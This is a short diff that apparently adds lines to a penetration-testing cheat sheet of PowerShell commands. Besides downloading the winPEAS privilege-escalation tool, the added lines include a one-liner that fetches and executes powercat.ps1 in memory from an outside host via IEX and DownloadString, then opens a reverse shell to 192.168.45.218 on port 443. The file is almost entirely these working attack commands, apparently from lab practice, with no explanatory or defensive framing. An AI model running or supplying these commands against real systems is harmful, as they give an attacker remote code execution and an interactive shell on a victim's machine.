@@ -1,2 +1,6 @@
 # Download server content:
 iwr -uri http://10.0.0.9/winpeas.exe -Outfile winPEAS.exe
+
+powershell.exe -c "iwr -uri http://10.0.0.9/winpeas.exe -Outfile winPEAS.exe"
+
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.218:8080/powercat.ps1'); powercat -c 192.168.45.218 -p 443 -e powershell"
